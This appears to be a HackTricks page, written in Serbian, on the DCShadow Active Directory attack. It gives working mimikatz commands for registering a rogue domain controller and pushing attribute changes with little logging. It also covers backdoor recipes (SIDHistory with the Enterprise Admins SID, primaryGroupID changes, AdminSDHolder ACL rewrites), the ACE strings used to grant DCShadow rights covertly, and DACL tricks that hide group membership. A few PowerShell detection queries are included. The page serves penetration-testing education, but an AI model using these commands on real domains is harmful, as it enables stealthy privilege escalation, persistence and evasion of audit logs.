# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Osnovne informacije

Registruje **novi Domain Controller** u AD-u i koristi ga za **push atributa** (SIDHistory, SPNs...) na navedene objekte, a da pritom ne ostavlja nikakve **logove** o **izmenama**. Potrebne su vam **DA** privilegije i morate se nalaziti unutar **root domena**.\
Imajte na umu da će se, ako koristite pogrešne podatke, pojaviti veoma ružni logovi.<sup>[[2]](#references)</sup>

Za izvođenje napada potrebne su vam 2 mimikatz instance. Jedna od njih će pokrenuti RPC servere sa SYSTEM privilegijama (ovde morate navesti izmene koje želite da izvršite), dok će se druga instanca koristiti za push vrednosti:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Imajte na umu da **`elevate::token`** neće raditi u `mimikatz1` session-u, jer time podiže privilegije thread-a, dok mi treba da podignemo **privilegiju process-a**.\
Takođe možete izabrati i "LDAP" object: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Promene možete izvršiti kao DA ili kao user sa sledećim minimalnim permissions:

- U **domain object-u**:
- _DS-Install-Replica_ (Add/Remove Replica in Domain)
- _DS-Replication-Manage-Topology_ (Manage Replication Topology)
- _DS-Replication-Synchronize_ (Replication Synchornization)
- **Sites object** (i njegovi child objekti) u **Configuration container-u**:
- _CreateChild and DeleteChild_
- Object računara koji je registrovan kao DC:
- _WriteProperty_ (ne Write)
- **target object**:
- _WriteProperty_ (ne Write)

Možete koristiti [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) da date ove privileges neprivilegovanom user-u (imajte na umu da će ovo ostaviti neke logs). Ovo je mnogo restriktivnije od DA privileges.\
Na primer: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Ovo znači da username _**student1**_, kada je ulogovan na mašini _**mcorp-student1**_, ima DCShadow permissions nad object-om _**root1user**_.

## Korišćenje DCShadow-a za kreiranje backdoor-a
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Zloupotreba primarne grupe, nedostaci enumeracije i detekcija

- `primaryGroupID` je zaseban atribut od liste grupe `member`. DCShadow/DSInternals mogu direktno da ga upišu (npr. da postave `primaryGroupID=512` za **Domain Admins**) bez nametanja ograničenja iz LSASS-a na samom računaru, ali AD i dalje **premešta** korisnika: promena PGID-a uvek uklanja članstvo iz prethodne primarne grupe (isto ponašanje važi za bilo koju ciljnu grupu), tako da nije moguće zadržati staro članstvo u primarnoj grupi.<sup>[[1]](#references)</sup>
- Podrazumevani alati sprečavaju uklanjanje korisnika iz njegove trenutne primarne grupe (`ADUC`, `Remove-ADGroupMember`), pa promena PGID-a obično zahteva direktne upise u direktorijum (DCShadow/`Set-ADDBPrimaryGroup`).
- Izveštavanje o članstvu je nedosledno:
- **Uključuje** članove izvedene iz primarne grupe: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Izostavlja** članove izvedene iz primarne grupe: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit pri proveri atributa `member`, `Get-ADUser <user> -Properties memberOf`.
- Rekurzivne provere mogu da izostave članove primarne grupe ako je **primarna grupa** sama ugnježđena (npr. PGID korisnika pokazuje na ugnježđenu grupu unutar Domain Admins); `Get-ADGroupMember -Recursive` ili LDAP rekurzivni filteri neće vratiti tog korisnika osim ako rekurzija eksplicitno ne razrešava primarne grupe.
- DACL trikovi: napadači mogu da **zabrane ReadProperty** nad `primaryGroupID` kod korisnika (ili nad atributom `member` grupe za grupe koje nisu zaštićene AdminSDHolder-om), čime se efektivno članstvo skriva od većine PowerShell upita; `net group` će i dalje razrešiti članstvo. Grupe zaštićene AdminSDHolder-om poništiće takve zabrane.

Primeri detekcije/nadzora:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Uporedite povlašćene grupe tako što ćete uporediti izlaz komande `Get-ADGroupMember` sa izlazom komande `Get-ADGroup -Properties member` ili alatom ADSI Edit, kako biste uočili razlike nastale zbog `primaryGroupID` ili skrivenih atributa.<sup>[[1]](#references)</sup>

## Shadowception - Dodela DCShadow dozvola pomoću DCShadow-a (bez logova o izmenjenim dozvolama)

Potrebno je da na kraj dodamo sledeće ACE-ove sa SID-om našeg korisnika:<sup>[[2]](#references)</sup>

- Na objektu domena:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Na objektu računara napadača: `(A;;WP;;;UserSID)`
- Na objektu ciljnog korisnika: `(A;;WP;;;UserSID)`
- Na objektu Sites u Configuration kontejneru: `(A;CI;CCDC;;;UserSID)`

Da biste dobili trenutni ACE objekta: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Imajte na umu da je u ovom slučaju potrebno izvršiti **nekoliko izmena,** a ne samo jednu. Zato u **mimikatz1 sesiji** (RPC serveru) koristite parametar **`/stack` uz svaku izmenu** koju želite da izvršite. Na ovaj način biće potrebno da samo jednom upotrebite **`/push`** kako biste izvršili sve nagomilane izmene na rogue serveru.

[**Više informacija o DCShadow-u na sajtu ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

## Reference

- [1] [TrustedSec - Avanture sa ponašanjem, izveštavanjem i eksploatacijom Primary Group-a](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [DCShadow analiza na sajtu ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
